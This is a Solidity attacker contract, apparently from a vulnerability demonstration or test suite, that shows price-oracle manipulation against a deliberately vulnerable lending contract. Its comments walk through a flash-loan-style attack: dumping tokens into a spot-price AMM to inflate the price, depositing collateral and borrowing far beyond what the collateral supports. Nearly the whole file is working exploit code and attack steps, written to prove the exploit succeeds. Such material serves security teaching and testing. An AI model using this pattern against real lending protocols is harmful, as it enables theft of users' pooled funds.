// SPDX-License-Identifier: MIT
// Vulnerability: OracleManipulation
// File: ATTACKER contract -- proves the exploit works
// =============================================
pragma solidity ^0.8.28;

import "./VulnerableOracleManipulation.sol";

// ---------------------------------------------------------------------------
// ATTACK STEPS (all in one transaction):
//
//   1. Start with a large ETH balance (simulates a flash loan)
//
//   2. Buy tokens from the AMM with a large ETH amount
//      ETH in  -> reserves shift -> token price rises (fewer tokens per ETH,
//      so each ETH is worth more tokens)
//      Wait -- getPrice() returns token/ETH. Buying tokens with ETH means:
//        reserveETH  increases
//        reserveToken decreases
//        price = reserveToken / reserveETH -> DECREASES
//      That makes ETH worth fewer tokens -- that hurts the borrow amount.
//
//      Correct manipulation direction:
//      BUY ETH with tokens (sell tokens, get ETH back)
//        reserveToken increases
//        reserveETH   decreases
//        price = reserveToken / reserveETH -> INCREASES
//      Now each ETH of collateral appears worth more tokens.
//      The lender thinks our collateral is worth more -> allows larger borrow.
//
//   3. Deposit ETH as collateral into the vulnerable lender
//
//   4. Call borrow() -- the oracle reads the inflated price
//      maxBorrow = (collateral * inflatedPrice * LTV) / 100
//      We borrow far more tokens than real collateral supports
//
//   5. Sell tokens back for ETH (price partially reverts)
//      Repay the flash loan
//      Keep the extra tokens as profit
//
//   Result: we hold tokens we did not earn. The vault has an
//   undercollateralized loan it cannot recover at real prices.
// ---------------------------------------------------------------------------

/// @title AttackerOracleManipulation
/// @notice Flash loan oracle manipulation -- pump price, overborrow, unwind
contract AttackerOracleManipulation {

    VulnerableOracleManipulation public lender;
    SpotPriceAMM                 public amm;
    address                      public owner;

    uint256 public stolenTokens;

    constructor(address _lender, address _amm) {
        lender = VulnerableOracleManipulation(payable(_lender));
        amm    = SpotPriceAMM(_amm);
        owner  = msg.sender;
    }

    /// @notice Execute the full oracle manipulation attack
    /// @param manipulateTokens tokens to dump into AMM to pump ETH price
    /// @param collateralETH    ETH to deposit as collateral
    /// @param borrowTokens     tokens to borrow at inflated price
    function attack(
        uint256 manipulateTokens,
        uint256 collateralETH,
        uint256 borrowTokens
    ) external payable {
        require(msg.sender == owner, "not owner");

        uint256 priceBefore = amm.getPrice();

        // step 2 -- pump the price: sell tokens into AMM to inflate token/ETH price
        // this requires the attacker to hold tokens going in
        // in practice obtained via a flash loan of tokens or swap of flash-loaned ETH
        // for test simplicity we assume the attacker contract already holds the tokens
        // (seeded in test setUp)
        if (manipulateTokens > 0) {
            amm.swapTokenforETH(manipulateTokens);
        }

        uint256 priceAfter = amm.getPrice();

        // step 3 -- deposit ETH collateral into the lender
        lender.depositCollateral{value: collateralETH}();

        // step 4 -- borrow at inflated price
        // the lender reads amm.getPrice() which now returns an inflated value
        lender.borrow(borrowTokens);

        stolenTokens = borrowTokens;

        // step 5 -- the attacker would unwind here:
        // swap tokens back to ETH, repay flash loan, keep profit
        // (omitted for test clarity -- the key proof is that borrow() succeeded)

        emit AttackExecuted(priceBefore, priceAfter, borrowTokens);
    }

    event AttackExecuted(
        uint256 priceBefore,
        uint256 priceAfter,
        uint256 tokensBorrowed
    );

    receive() external payable {}

}
